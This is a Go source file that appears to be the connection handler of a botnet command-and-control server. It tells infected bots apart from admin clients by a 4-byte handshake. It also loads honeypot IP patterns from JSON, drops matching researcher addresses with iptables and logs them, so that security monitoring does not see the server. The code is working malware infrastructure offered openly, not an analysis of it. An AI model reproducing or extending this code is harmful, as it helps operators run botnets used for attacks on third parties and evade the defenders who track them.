package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"
)

type IPPattern struct {
	parts [4]interface{}
}

var (
	honeypotPatterns []IPPattern
	honeypotMutex    sync.RWMutex
)

func initialHandler(conn net.Conn) {
	defer conn.Close()
	
	if checkAndBlockHoneypot(conn) {
		return
	}

	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	buf := make([]byte, 32)
	l, err := conn.Read(buf)
	if err != nil || l <= 0 {
		return
	}

	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		if buf[3] > 0 {
			string_len := make([]byte, 1)
			l, err := conn.Read(string_len)
			if err != nil || l <= 0 {
				return
			}
			var source string
			if string_len[0] > 0 {
				source_buf := make([]byte, string_len[0])
				l, err := conn.Read(source_buf)
				if err != nil || l <= 0 {
					return
				}
				source = string(source_buf)
			}
			NewBot(conn, buf[3], source).Handle()
		} else {
			NewBot(conn, buf[3], "").Handle()
		}
	} else {
		NewAdmin(conn).Handle()
	}
}

func checkAndBlockHoneypot(conn net.Conn) bool {
	remoteAddr, ok := conn.RemoteAddr().(*net.TCPAddr)
	if !ok {
		return false
	}

	ip := remoteAddr.IP
	if ipv4 := ip.To4(); ipv4 != nil {
		honeypotMutex.RLock()
		defer honeypotMutex.RUnlock()

		for _, pattern := range honeypotPatterns {
			if pattern.Match(ipv4) {
				patternStr := pattern.ToString()
				ipStr := conn.RemoteAddr().String()
				
				fmt.Printf("\x1b[38;5;231m[ \x1b[38;5;63mHoneypot detected \x1b[38;5;231m] \x1b[38;5;226mIP \x1b[38;5;231m: \x1b[38;5;226m%s \x1b[38;5;231m| Pattern \x1b[38;5;231m: \x1b[38;5;226m%s\n", ipStr, patternStr)

				ipOnly := strings.Split(ipStr, ":")[0]
				cmd := exec.Command("sudo", "iptables", "-A", "INPUT", "-s", ipOnly, "-j", "DROP")
				if err := cmd.Run(); err != nil {
					log.Printf("Failed to block IP %s: %v", ipOnly, err)
				} else {
					fmt.Printf("\x1b[38;5;231m[ \x1b[38;5;195mBlocked honeypot \x1b[38;5;231m] \x1b[38;5;226mIP \x1b[38;5;231m: \x1b[38;5;226m%s \x1b[38;5;231m| Pattern \x1b[38;5;231m: \x1b[38;5;226m%s\n", ipStr, patternStr)
				}

				logFile, err := os.OpenFile("logs/honeypot.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if err != nil {
					log.Printf("Failed to open log file: %v", err)
				} else {
					defer logFile.Close()
					timestamp := time.Now().Format("2006-01-02 15:04:05")
					logEntry := fmt.Sprintf("[%s] Honeypot detected - IP: %s, Pattern: %s\n", timestamp, ipStr, patternStr)
					if _, err := logFile.WriteString(logEntry); err != nil {
						log.Printf("Failed to write to log file: %v", err)
					}
				}
				return true
			}
		}
	}
	return false
}


func loadHoneypotPatterns(filename string) error {
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	var ranges []string
	if err := json.NewDecoder(file).Decode(&ranges); err != nil {
		return err
	}

	var patterns []IPPattern
	for _, s := range ranges {
		pattern, err := parsePattern(s)
		if err != nil {
			continue
		}
		patterns = append(patterns, pattern)
	}
	
	honeypotMutex.Lock()
	honeypotPatterns = patterns
	honeypotMutex.Unlock()

	return nil
}

func parsePattern(s string) (IPPattern, error) {
	parts := strings.Split(s, ".")
	var pattern [4]interface{}

	for i := 0; i < 4; i++ {
		if i < len(parts) {
			if parts[i] == "*" {
				pattern[i] = nil
			} else {
				num, err := strconv.Atoi(parts[i])
				if err != nil || num < 0 || num > 255 {
					return IPPattern{}, errors.New("invalid pattern")
				}
				pattern[i] = byte(num)
			}
		} else {
			pattern[i] = nil
		}
	}
	return IPPattern{parts: pattern}, nil
}

func (p *IPPattern) Match(ip net.IP) bool {
	ip = ip.To4()
	if ip == nil {
		return false
	}
	for i := 0; i < 4; i++ {
		if p.parts[i] != nil && p.parts[i].(byte) != ip[i] {
			return false
		}
	}
	return true
}

func (p *IPPattern) ToString() string {
	parts := make([]string, 4)
	for i, part := range p.parts {
		if part == nil {
			parts[i] = "*"
		} else {
			parts[i] = fmt.Sprintf("%d", part.(byte))
		}
	}
	return strings.Join(parts, ".")
}